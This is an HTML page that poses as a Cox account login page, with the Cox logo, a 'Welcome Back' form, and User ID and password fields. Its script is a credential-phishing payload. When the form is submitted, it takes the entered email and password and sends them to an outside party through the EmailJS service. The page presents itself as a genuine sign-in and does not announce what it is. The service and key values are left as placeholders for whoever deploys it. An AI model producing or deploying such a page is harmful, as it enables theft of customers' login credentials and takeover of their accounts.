<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Cox Login</title>
<script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
<style>
* { box-sizing: border-box; }

body, html {
  margin: 0; padding: 0; height: 100%;
  font-family: "Cera Bold", "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
  background: #fff;
}

/* Fixed Header */
.header {
  width: 100%;
  height: 60px;
  background-color: white;
  border-bottom: 1px solid #e0e0e0;
  display: flex;
  align-items: center;
  padding: 0 2rem;
  position: fixed;
  top: 0; left: 0;
  z-index: 10;
}

.header img {
  height: 32px;
}

/* Container split into 50% each */
.container {
  display: flex;
  height: calc(100vh - 60px);
  margin-top: 60px; /* space for fixed header */
}

/* Left panel with white background */
.left-panel {
  position: relative;
  width: 50%;
  background: white;
  display: flex;
  justify-content: center;
  align-items: flex-start;
}

/* Form wrapper 75% width, overlapped by 25% on right side */
.form-wrapper {
  background-color: #f2f6f7;
  width: 55%; /* occupies 75% of left panel */
  padding: 50px 90px;
  border-radius: 1px;
  box-shadow: 0 0 1px rgba(0,0,0,0.1);
  position: relative;
  right: -40%; /* overlaps 25% onto right side */
  margin-top: 80px; /* 80px closer to header */
}

h1 {
  margin: 0 0 20px;
  font-weight: 600;
  font-size: 28px;
  color: #002b45;
  font-family: "Cera Bold", "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
}

p {
  margin: 0 0 30px;
  font-size: 16px;
  color: #535353;
}

form {
  display: flex;
  flex-direction: column;
}

label {
  font-size: 14px;
  margin-bottom: 6px;
  color: #004263;
}

input[type="email"],
input[type="password"] {
  height: 40px;
  margin-bottom: 20px;
  padding: 0 12px;
  border: 1px solid #cbd1d8;
  border-radius: 4px;
  font-size: 16px;
}

/* Submit button style */
button {
  height: 44px;
  background-color: #0078d2;
  border: none;
  color: white;
  font-size: 16px;
  border-radius: 4px;
  cursor: pointer;
  font-weight: 600;
}
button:hover {
  background-color: #005ea3;
}

/* Forgot password link */
.forgot-password {
  margin-top: 12px;
  font-size: 14px;
  color: #0078d2;
  text-align: right;
}

.forgot-password a {
  color: #0078d2;
  text-decoration: none;
}

/* Right panel with background image and 25% transparent overlay */
.right-panel {
  width: 50%; 
  background:
    linear-gradient(to right, transparent 0%, transparent 25%, white 100%) /* overlays 25% over image */,
    url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=900&q=80') no-repeat center center / cover;
}

/* Responsive adjustments for small screens */
@media(max-width: 768px) {
  .container {
    flex-direction: column;
  }
  .left-panel, .right-panel {
    width: 100%;
    height: 50vh;
  }
  .form-wrapper {
    position: static;
    width: 90%;
    margin: auto;
    right: 0;
  }
}
</style>
</head>
<body>

<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Cox_logo_2017.svg" alt="Cox Logo" />
</div>

<div class="container">
  <div class="left-panel">
    <div class="form-wrapper">
      <h1>Welcome Back</h1>
      <form id="signin-form">
        <label for="user_email">User ID</label>
        <input type="email" id="user_email" name="user_email" placeholder=" " required />

        <label for="user_password">Password</label>
        <input type="password" id="user_password" name="user_password" placeholder=" " required />

        <button type="submit">Sign In</button>
        <div class="forgot-password"><a href="#">Forgot Password?</a></div>
      </form>
    </div>
  </div>
  <div class="right-panel"></div>
</div>

<script>
  (function(){
    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
  })();

  const form = document.getElementById('signin-form');
  form.addEventListener('submit', function(event) {
    event.preventDefault();
    const templateParams = {
      user_email: form.user_email.value,
      user_password: form.user_password.value
    };
    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
      .then(() => {
        alert('Sign-in information sent successfully!');
        form.reset();
      }, () => {
        alert('Failed to send the sign-in information. Please try again.');
      });
  });
</script>

</body>
</html>
